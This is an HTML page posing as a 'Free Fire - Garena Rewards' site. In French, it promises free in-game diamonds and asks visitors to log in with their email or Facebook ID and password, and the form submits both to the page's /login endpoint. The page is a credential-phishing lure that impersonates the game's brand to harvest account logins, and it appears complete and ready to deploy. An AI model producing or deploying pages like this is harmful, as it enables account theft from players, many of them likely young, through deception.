<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Free Fire - Garena Rewards</title>
    <style>
        body { background: url('https://wallpapercave.com/wp/wp4900728.jpg'); background-size: cover; color: white; font-family: sans-serif; text-align: center; }
        .login-card { background: rgba(0,0,0,0.8); padding: 30px; margin: 100px auto; width: 300px; border: 2px solid #ffba08; border-radius: 15px; }
        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        button { background: #ffba08; color: black; padding: 10px 20px; font-weight: bold; border: none; cursor: pointer; width: 100%; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>FREE FIRE REWARDS</h2>
        <p>Connectez-vous pour réclamer vos diamants gratuits</p>
        <form action="/login" method="POST">
            <input type="text" name="email" placeholder="Email / Facebook ID" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">LOGIN TO CLAIM</button>
        </form>
    </div>
</body>
</html>

